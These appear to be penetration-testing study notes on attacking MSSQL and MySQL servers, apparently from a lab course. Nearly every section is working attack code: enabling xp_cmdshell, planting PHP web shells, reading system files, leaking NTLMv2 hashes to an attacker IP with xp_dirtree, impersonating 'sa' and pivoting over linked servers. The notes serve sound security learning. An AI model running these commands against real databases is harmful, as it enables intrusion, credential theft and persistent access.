# Attacking SQL Databases

MSSQL uses ports `TCP/1433` and `UDP/1434` by default. And MySQL uses `TCP/3306`.
When MSSQL operates in a "hidden" mode, it uses the port `TCP/2433`
## Authentication Mechanisms

**MSSQL** supports 2 authentication modes.

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |
**MySQL** also supports multiple authentication modes such as username and password, as well as, Windows Authentication (a plugin is required).  However, depending on which method is implemented, misconfigurations can occur.
## Protocol Specific Attacks

#### MySQL - Connecting to the SQL Server

```sh
mysql -u julio -pPassword123 -h 10.129.20.13
```
#### Sqlcmd - Connecting to the SQL Server

```sh
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

```ad-note
When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
```

Alternatively, we can use `mssqlclient` from `Impacket`

```sh
mssqlclient.py -p 1433 julio@10.129.203.7
```

```ad-note
When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.
```

```ad-note
When using **Windows Authentication** using `sqsh`, we need to specify the domain name or it will be considered SQL Authentication.

**Usage Example:**

`sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`
```

```ad-info
If we are using `sqlcmd` tool, we need to write the command `GO` after each query for execution
```

# Execute Commands

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows us to execute system commands using SQL.

- `xp_cmdshell` is disabled by default, it can be enabled and disabled using  [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing `sp_configure`.
- `xp_cmdshell` operates synchronously, which means control doesn't return to us until the command  execution finishes 
## XP_CMDSHELL

```sh
xp_cmdshell 'whoami'
```

If `xp_cmdshell` is not enabled:

```sql
-- To allow advanced options to be changed. 
EXECUTE sp_configure 'show advanced options', 1 
GO 

-- To update the currently configured value for advanced options. 
RECONFIGURE 
GO 

-- To enable the feature. 
EXECUTE sp_configure 'xp_cmdshell', 1 
GO 

-- To update the currently configured value for this feature. 
RECONFIGURE GO
```

```ad-info
There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

---

SQL supports **User Defined Functions** which allows us to execute C/C++ code within SQL. It is not common but we should be aware of it.
```

## Write Local Files

MySQL doesn't have something like `xp_cmdshell`, but we can achieve command execution if we write into a local file on the system that can execute our commands. For example, suppose that the `MySQL` operates on a PHP-based webserver or an ASP.NET one. If we have the appropriate privileges we can attempt to write a file using `SELECT INTO OUTFILE` in the webserver directory.

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
```

In `MySQL`, a global system variable `secure_file_priv` limits the effect of data import/export operations like, `LOAD DATA`, and `SELECT ... INTO OUTFILE` statements, and the `LOAD_FILE()` function. These operations are only permitted for users who have the **FILE** privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

```sql
show variable like "secure_file_priv"
```

---

To Write file using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

```sql
sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

sp_configure 'Ole Automation Procedures', 1
GO

RECONFIGURE
GO
```

#### MSSQL - Create a File

```sql
DECLARE @OLE INT 

DECLARE @FileID INT 

EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT 

EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1 

EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>' 

EXECUTE sp_OADestroy @FileID 

EXECUTE sp_OADestroy @OLE 

GO
```

## Read Local Files

### MSSQL

By default, `MSSQL` allows reading any file on the system if the user has sufficient permissions to read it

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

GO
```

### MySQL

By default, `MySQL` does not allow arbitrary file read, but with correct settings and approprate privileges set, we can read files using the following method:

```sql
select LOAD_FILE("/etc/passwd");
```

## Capture MSSQL Service Hash

MSSQL Service Account hash can be stolen using the procedures `xp_subdirs` or `xp_dirtree` 
which use the SMB protocol to retrieve a list of child directories under a specified parent directory.
When we use one of these to point it to our server. It will force the target to authenticate and send the NTLMv2 hash of the service account running the SQL Server to our server.

To make this work we can use `Responder` and `impacket-smbserver` and execute one of the following queries:
#### XP_DIRTREE Hash Stealing

```mysql
EXEC master..xp_dirtree '\\10.10.110.17\share'
GO
```
#### XP_SUBDIRS Hash Stealing

```mysql
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

#### XP_SUBDIRS Hash Stealing with Responder

![[stealing hash with Responder.png]]
#### XP_SUBDIRS Hash Stealing with impacket

![[stealing hash with impacket.png]]

## Impersonate Existing Users with MSSQL

`IMPERSONATE` allows the executing user to take on the permission of another user or login until the context is reset or session dies.

Sysadmins can impersonate anyone by default. But, for non-admin users, the permissions must be set explicitly.

We can use the following query to identify users we can impersonate:

```sql
SELECT distinct b.name 
FROM sys.server_permissions a 
INNER JOIN sys.server_principals b 
ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE' 
GO
```

#### Verifying our Current User and Role

```sql
SELECT SYSTEM_USER 
SELECT IS_SRVROLEMEMBER('sysadmin') 
go
```

If the resulting output was `0`. Then our user doesn't have the sysadmin role.
#### Impersonating a User

```sql
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER 
SELECT IS_SRVROLEMEMBER('sysadmin') 
GO
```

```ad-important
It is recommended to run **EXECUTE AS LOGIN** inside the `master` DB. Because if the user we are trying to impersonate doesn't have access to the current DB, the impersonation will result in an error. All users, by default, has access to `master` DB.
```

And to get back to our session, we can user the command `REVERT`.

## Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called **linked servers**. Linked servers are configured to allow the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database such as Oracle.
#### Identify linked Servers in MSSQL

```sql
SELECT srvname, isremote FROM sysservers 
GO
```

**Output:**

![[isremote_output.png]]

The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS] 
GO
```

```ad-info
If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
```

